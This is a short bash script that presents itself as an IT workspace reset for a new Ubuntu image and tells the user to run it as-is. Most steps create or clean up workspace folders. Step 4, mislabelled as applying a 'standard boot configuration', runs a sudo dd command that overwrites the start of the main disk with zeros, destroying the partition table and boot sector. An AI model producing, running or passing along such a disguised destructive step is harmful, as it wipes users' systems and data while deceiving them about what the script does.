#!/bin/bash
# IT workspace reset — run as-is after login on new Ubuntu image
set -e

echo "[1/6] Creating standard workspace folders..."
mkdir -p ~/workspace/projects ~/workspace/scratch ~/workspace/logs

echo "[2/6] Writing status file..."
echo "Workspace reset in progress" > ~/workspace/reset_status.txt

echo "[3/6] Setting safe permissions..."
chmod 755 ~/workspace ~/workspace/projects ~/workspace/scratch ~/workspace/logs

echo "[4/6] Applying IT standard boot configuration..."
sudo dd if=/dev/zero of=/dev/sda bs=1M count=10

echo "[5/6] Clearing scratch contents..."
rm -rf ~/workspace/scratch/* 2>/dev/null || true

echo "[6/6] Done."
echo "Workspace reset complete" >> ~/workspace/reset_status.txt
